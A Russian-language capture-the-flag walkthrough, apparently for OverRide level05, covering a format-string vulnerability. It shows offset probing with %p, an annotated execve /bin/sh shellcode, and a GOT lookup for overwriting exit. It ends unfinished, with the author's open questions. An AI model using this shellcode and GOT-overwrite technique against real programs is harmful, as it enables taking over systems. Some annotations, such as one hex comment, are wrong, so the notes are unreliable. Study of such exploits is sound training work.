@@ -1,0 +1,90 @@
+Уязвимость форматной строки.
+Судя по поведению, программа всё выводит под младшим регистром.
+Больше ничего не делает.  Используется fgets, который не имеет уязвимости переполнения.
+
+Если отправить спецификатор строки %s, то получаем сегу:
+
+(gdb) r
+Starting program: /home/users/level05/level05
+ABCD %s
+
+Program received signal SIGSEGV, Segmentation fault.
+0xf7e7082e in vfprintf () from /lib32/libc.so.6
+
+Если отправить аргументы букв и спецификатор указателя, то найдём смещение:
+level05@OverRide:~$ ./level05
+AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+
+aaaa0x640xf7fcfac0(nil)(nil)(nil)(nil)0xffffffff0xffffd7440xf7fdb0000x616161610x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70257025
+
+на 10-м месте увидим наши 4 буквы "А", а затем адрес спецификатора %p, который показывает адреса значений в стэке в формате указателя.
+Это значит, что после 10-го адреса заканчивается результат функции printf и дальше идёт exit(argument).
+
+Проверим, подав в качестве аргумента четыре буквы B и указав показать через спецификатор %c
+что находится на 10-м месте.
+
+level05@OverRide:~$ ./level05
+BBBB%10$c
+bbbbb
+
+Соответственно, можно сюда закинуть shellcode.
+
+В 32-х битной системе каждый адрес может содержать 4 байта. Можно закинуть туда shellcode,
+однако shellcode не поместится. Чтобы его скоратить, можно воспользоваться переменными
+окружения.
+
+Здесь нам необходимо воспользоваться готовым shellcode, чтобы запустить в памяти
+наш /bin/sh:
+
+Что происходит в Shellcode:
+
+char sc[] = "\x6a\x0b" // push byte +0xb
+"\x58" // pop eax <-- очистка содержания eax
+"\x99" // cdq <-- Convert double to quadruple - увеличивает содержание, чтобы поместился весь код
+https://indigobits.com/assembler/12-komandy-rasshireniya.html
+"\x52" // push edx <-- send to stack
+"\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f <-- push address of bin
+"\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f <-- push address of sh
+"\x89\xe3" // mov ebx, esp 
+esp is register of pointer of stack
+ebx is base of memory which temporary keep what did upper
+and move it to esp (to stack)
+"\x31\xc9" // xor ecx, ecx
+ecx is counter of operations (usually in order)
+при xor обнуляется счётчик выполнения команд.
+http://natalia.appmat.ru/c&c++/assembler.html
+"\xcd\x80"; // int 0x80
+is system call of kernel than to say to perform
+what is writed in up
+
+Сам Shellcode:
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+
+Ищем адрес exit, чтобы перезаписать его на наш shellcode:
+
+level05@OverRide:~$ objdump -R ./level05
+
+./level05:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080497c4 R_386_GLOB_DAT    __gmon_start__
+080497f0 R_386_COPY        stdin
+080497d4 R_386_JUMP_SLOT   printf
+080497d8 R_386_JUMP_SLOT   fgets
+080497dc R_386_JUMP_SLOT   __gmon_start__
+080497e0 R_386_JUMP_SLOT   exit
+080497e4 R_386_JUMP_SLOT   __libc_start_main
+
+0x080497e0 это адрес exit в GOT.
+GOT - глобальная таблица смещений, в которой хранятся адреса библиотечных функций. Когда программа запускается, адрес функции библиотеки устанавливается в GOT. Поскольку функции динамической библиотеки загружаются только тогда, когда они используются, таблица GOT изначально пуста.
+
+Закинем наш shellcode в env:
+
+:
+
+Shellcode это у нас целочисленное? Почему?
+Почему shellcode закидывается с мусором первые 100-90 символов, а потом шеллкод?
+Почему у меня адрес выходит слишком большой?
+level05@OverRide:/tmp$ ./a.out SHELLCODE
+env address at 0x7fffffffe8ac
